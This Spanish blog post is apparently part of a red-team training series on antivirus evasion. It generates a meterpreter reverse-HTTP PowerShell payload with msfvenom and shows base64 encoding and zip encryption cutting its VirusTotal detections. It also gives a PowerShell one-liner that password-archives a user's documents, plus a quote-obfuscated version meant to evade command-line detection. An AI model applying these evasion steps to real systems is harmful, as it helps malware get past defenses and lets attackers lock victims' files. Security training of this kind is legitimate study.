---
title: Evasión de Antivirus 3 - Fases y ofuscación
description: Comenzamos a ver métodos de ofuscación
date: 2026-05-02
categories: [evasion]
tags: [opsec, Evasion, bypass, Ofuscación, redteam, Formación]     # Los tags deben estar siempre en minúsculas.
image:
  path: /assets/img/malware3/logo.png

---
## 1. ¿Fases?
Creo que hemos asentado unas bases durante los dos artículos anteriores para poder ir evaluando algunas técnicas de evasión, pero si estás leyendo esto probablemente te vayas a enfrentar al mismo problema que me enfrenté yo.... quieres ir a lo dificil sin pasar por los pasos previos. Normal porque está chulo, pero hay que ir con calma o es imposible avanzar en los conceptos que veremos. <br>
¿Fases? ¿De verdad? Pues sí, pero no solo para aprender, sino de cada una de las técnicas que debes de aprender para cada una de las situaciones que se te van a presentar. 
Osea que vas a estudiar más que en toda tu vida y la mitad de las técnicas o las interiorizas o no te servirán. <br>
Cuando realices un Red Team sobre el cual apliques cada una de estas técnicas vas a necesitar implementar en cada técnica una serie de consideraciones que te permiten avanzar dentro del ataque. Lo que quiero decir es.... no es lo mismo elaborar una evasión para un dropper que elaborarla para tu shellcode o para una herramienta que necesitas usar. De la misma manera que tampoco lo es para una fase de exfiltración. Son campos muy separados, pero lo importante es como en todo la metodología y la profundidad que podamos aplicar en el análisis. <br>
Todo esto para decirte que si piensas aplicar una sola técnica en todo, como verás será completamente ineficaz. <br>
Como puede que aún con este preeliminar no quede claro a lo que me refiero, resumo todo lo anterior en lo siguiente: <br>

![Desktop View](/assets/img/malware3/1.jpeg){: width="486" height="294" }

## 2. ¿Que es la ofuscación?
La ofuscación es de manera muy muy general una serie de técnicas que nos permiten ocultar algo para evitar su análisis y detección. Existen multitud de herramientas para ofuscar el contenido de nuestro payload, aunque para ello es bastante importante tener claro que es lo queremos ofuscar. Un error bastante común es usar herramientas de ofuscación "a lo bruto" es decir, coger un payload, pasarlo por herramienta X que hemos encontrado en Github y está de moda y a otra cosa. Tenemos que tener en cuenta que la ofuscación es algo llamativo. Aún así vamos a comenzar con métodos sencillos para entender a que nos estamos refiriendo. <br>

Vamos a trabajar con msfvenom para generar una payload de meterpreter en powershell. No vamos a consigurar nada porque tampoco nos es necesario. 

![Desktop View](/assets/img/malware3/2.png)

```text
msfvenom --payload windows/x64/meterpreter_reverse_http --format psh -o nocalc.ps1
```
El contenido sería algo así:

![Desktop View](/assets/img/malware3/4.png)

Como puedes ver nos detecta porque este payload está super firmado y es fácil detectarlo.

![Desktop View](/assets/img/malware3/3.png)

Vale pues lo que vamos a hacer en este punto es encodear nuestro payload. Si la ofuscación consiste en coger algo y dificiultar su lectura podemos convertirlo en base64 para que sea lo mismo pero de otra manera. Lo hacemos a lo bruto. 

```text
base64 -w 0 nocalc.ps1 > nocalcb64.ps1
```

Y lo analizamos con Virus Total. Y ostrás hay 11 antivirus menos que verían nuestro payload!

![Desktop View](/assets/img/malware3/5.png)

Vale ¿y si iteramos esto? Vamos a repetir este proceso 3 veces a ver si cambia el resultado. 

![Desktop View](/assets/img/malware3/6.png)

Vamos a verificar si ha cambiado algo y ahora nos detectan menos. 

![Desktop View](/assets/img/malware3/7.png)

Pues parece ser que no! Han aumentado las herramientas que nos detectan. ¿Porque puede ser esto? Bueno es un base 64 de gran tamaño que cuando lo desencodeas aparece otro ¿Esto es un comportamiento anómalo que puede hacer que algunos antivirus cambien su comportamiento. Con esto las herramientas de antimalware tienden a ser herméticas, pero la lógica que venimos hablando es simple: cuanto más normal parezca mejor. Bueno, hemos conseguido pasar un payload de 26 a 11 detecciones! No es mal comienzo!



## 3. ¿Que es el cifrado?
Cifrar y ofuscar es diferente y tiene un sentido diferente. Cuando ciframos hacemos inaccesible matemáticamente un contenido mediante por ejemplo una clave, en el caso de la criptografía simétrica. Osease, que puedo cifrar un payload para que no se detecte, Vamos a usar nuestro último payload que era detectado por 15 motores diferentes y lo vamos a cifrar usando zip de manera sencilla. Cuando lo ejecutemos le pondremos una contraseña. 

```text
zip -e nocalcb64_3.zip nocalcb64_3.ps1
```

Ciframos el payload

![Desktop View](/assets/img/malware3/8.png)

Lo subimos sin proporcionarle la contraseña a Virus Total y hecho! 0 detecciones! 

![Desktop View](/assets/img/malware3/9.png)

Aquí habríamos conseguido pasar un payload malicioso cifrado que no es detectable en el estado actual. <br>
Puede que no seas consciente todavía pero en este momento tienes varios contras:
- El principal es que no puedes acceder al payload sin la contraseña, por lo que tienes que descifrarlo. En el momento que descifres el payload si que permites a los motores de análisis mirarlo.
- Tienes que tener en cuenta que un fichero, sobre todo un ejecutable, que llega en un fichero cifrado con contraseña suele llamar la atención a los sistemas antimalware ya que es una forma conocida de hacer llegar malware. Por lo que en algunas ocasiones puede no ser útil.
<br>
De igual manera esto no es relevante ya que la idea era explicar el concepto. Normalmente cuando vamos a ver técnicas de evasión lo haremos en diferentes capas del ataque y una puede ser el delivery, pero en el caso del malware esto no está "por fuera" cifrando el malware sino dentro del mismo solicitando descifrandose cuando es necesario. De

## 4. Ofuscación de comandos 
En muchas ocasiones vamos a ejecutar comandos por consola como parte de nuestras acciones. Una manera que en ocasiones podemos usar para tratar de evadir la detección por commandline de algunas herramientas es dificultar el cumplimiento de reglas sencillas o su lectura. Por ejemplo he creado un pequeño onelinner en powershell que lo que hace es ejecutar winrar y cifrar todos los archivos que tengan unas extensiones determinadas. <br>

```text
powershell -Command "& 'C:\Program Files\WinRAR\rar.exe' a -m5 -hp 'MiContraseña123' 'C:\Users\galletas\Desktop' @((Get-ChildItem -Path 'C:\Users\galletas\Desktop' -Filter '*.doc' -File) + (Get-ChildItem -Path 'C:\Users\galletas\Desktop' -Filter '*.xls' -File)).FullName"
```

Mi objetivo es limitar la capacidad de detección de un comando que voy a ejecutar por consola por lo que puedo abusar de la propia interpretación de comandos con las posibilidades que me de el sistema en el que lo ejecuto. Por ejemplo en powershell podría hacer lo siguiente. <br>

```text
pOWeRshell —co"mM" "& 'C:\P"r"og"ra"m F"iles\WinR"A"R\ra"r.e"x"e' a -"m"5 -"h"p 'Mi"Contra"s"eña1"23' 'C:\b"a"ck"u"p\c"om"p"r"i"m"i"d"o.rar' @((Get-C"h"il"d"It"e"m -"P"ath 'C:\d"a"tos' -"Fi"l"t"er '*.doc' -F"i"le) + (G"e"t-"C"h"ild"It"e"m -P"a"th 'C:\d"a"tos' -Filt"e"r '*.xls' -"F"i"le)).F"u"l"lName"
```

Realmente el comando ejecuta lo mismo pero hemos cambiado lo que se muestra por commandline, esto dificulta que por ejemplo exista una regla en la que que si ejecutas C:\Program Files\WinRAR\rar.exe salte el antivirus ya que la detección por commandline se dificulta. Logicamente existen muchos (muchisimos) más métodos de detección. En este punto os puedo recomendar [**argfuscator.net**](https://argfuscator.net/) con su [**repositorio de github**](https://github.com/wietze/ArgFuscator.net) por si lo quieres en local. Teneís un [**artículo detallado**](https://www.wietzebeukema.nl/blog/bypassing-detections-with-command-line-obfuscation) del creador [**Wietze Beukema**](https://www.wietzebeukema.nl/) en el cual ayuda a comprender esta técnica en profundidad. 


![Desktop View](/assets/img/malware3/10.png)





---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicación te ha sido útil y quieres apoyar mi trabajo para que continúe creando más contenido, aquí te dejo algunas formas de apoyar:

1. **Compartir el contenido**  📲
   Si crees que esta guía puede ser útil para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  💖
   Puedes hacer una donación rápida a través de Ko-fi para ayudarme a seguir publicando guías y tutoriales. ¡Cada aportación cuenta y es muy apreciada! 
   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 
   
3. **Usa mi enlace de afiliado de NordVPN y NordPass para mejorar tu seguridad y apoyar la creación de contenido**  🛡️
   Puedes suscribirte a [**NordVPN**](https://go.nordvpn.net/aff_c?offer_id=15&aff_id=132246&url_id=902) con un 75% de descuento y 3 meses gratis o a [**NordPass**](https://nordpass.com/special/?utm_medium=affiliate&utm_term&utm_content&utm_campaign=off488&utm_source=aff132246&aff_free) con un 53% de descuento y 3 meses gratis y mejorar tu seguridad a la vez que apoyas el contenido de ciberseguridad en español. <br>


---

¡Gracias por tu apoyo! 🙏
![Desktop View](/assets/img/banner.png) <br>
